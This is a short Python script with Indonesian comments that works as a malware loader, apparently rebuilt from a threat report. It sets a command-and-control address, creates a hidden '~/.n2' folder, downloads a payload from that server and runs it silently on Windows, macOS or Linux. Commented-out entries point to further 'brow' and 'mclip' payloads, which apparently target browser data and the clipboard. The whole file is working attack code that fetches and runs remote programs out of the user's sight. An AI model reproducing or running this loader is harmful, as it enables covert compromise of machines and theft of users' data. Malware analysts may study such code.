import os
import sys
import platform
import requests
import subprocess
import time
import base64
import zlib

# Konfigurasi C2
C2_HOST = "http://192.168.0.29:1224"  # Sesuai laporan
PAYLOADS = {
    "payload": f"{C2_HOST}/payload/99/73",
    # "brow": f"{C2_HOST}/brow/99/73",
    # "mclip": f"{C2_HOST}/mclip/99/73"
}
HIDDEN_DIR = os.path.expanduser("~/.n2")  # Direktori tersembunyi
SLEEP_INTERVAL = 5  # Interval untuk retry jika gagal


# Fungsi untuk mendeteksi OS
def detect_os():
    os_type = platform.system().lower()
    if "windows" in os_type:
        return "windows"
    elif "darwin" in os_type:
        return "macos"
    elif "linux" in os_type:
        return "linux"
    else:
        return "unknown"


# Fungsi untuk membuat direktori tersembunyi
def setup_hidden_dir():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
        # Sembunyikan direktori di Windows
        if detect_os() == "windows":
            subprocess.run(["attrib", "+h", HIDDEN_DIR], shell=True)


# Fungsi untuk mengunduh payload dari C2
def download_payload(url, filename):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            filepath = os.path.join(HIDDEN_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(response.content)
            return filepath
        else:
            print(f"[-] Gagal mengunduh {filename}: Status {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error saat mengunduh {filename}: {e}")
        return None


# Fungsi untuk mengeksekusi payload
def execute_payload(filepath):
    os_type = detect_os()
    try:
        if os_type == "windows":
            # Jalankan secara diam-diam di Windows
            subprocess.Popen(["python", filepath], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            # Jalankan di Linux/macOS
            subprocess.Popen(["python3", filepath], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Berhasil mengeksekusi {filepath}")
    except Exception as e:
        print(f"[-] Gagal mengeksekusi {filepath}: {e}")


# Fungsi utama Main99
def main99():
    print("[*] Payload dimulai...")
    setup_hidden_dir()

    # Daftar payload untuk diunduh dan dieksekusi
    payloads_to_download = [
        ("payload", "pay99_73.py"),
        # ("brow", "brow99_73.py"),
        # ("mclip", "mclip15_99.py")
    ]

    for payload_name, filename in payloads_to_download:
        url = PAYLOADS[payload_name]
        print(f"[*] Mengunduh {payload_name} dari {url}")

        filepath = download_payload(url, filename)
        if filepath:
            execute_payload(filepath)
        else:
            print(f"[-] Gagal mengunduh {payload_name}, mencoba lagi dalam {SLEEP_INTERVAL} detik")
            time.sleep(SLEEP_INTERVAL)

    print("[*] Main99 selesai menjalankan tugas")


if __name__ == "__main__":
    main99()